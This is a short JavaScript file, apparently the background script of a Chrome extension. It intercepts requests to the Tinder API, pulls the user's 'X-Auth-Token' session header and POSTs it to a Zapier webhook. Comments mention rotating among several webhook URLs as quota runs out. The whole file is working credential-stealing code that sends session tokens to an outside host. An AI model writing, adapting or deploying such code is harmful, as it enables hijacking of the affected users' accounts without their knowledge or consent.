// Grabbing 'X-Auth-Token' from user before making
// request to https://api.gotinder.com/
chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    details.requestHeaders.map(header => {
      if(header.name === 'X-Auth-Token') {
        console.log(header.value)
        // Push to webhook
        const data = { token: header.value };
        
        // Whenever we run out of task change out the urls
        // https://hooks.zapier.com/hooks/catch/7281121/o59asee/
        // https://hooks.zapier.com/hooks/catch/7281849/o59cs9m/
        fetch('https://hooks.zapier.com/hooks/catch/7281849/o59cs9m/', {
          method: 'POST', // or 'PUT'
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        })
        .then((response) => response.json())
        .then((data) => {
          console.log('Success:', data);
        })
        .catch((error) => {
          console.error('Error:', error);
        });
      }
    })
  },
  {urls: ['https://api.gotinder.com/v2/meta?*']},
  ["blocking", "requestHeaders"]);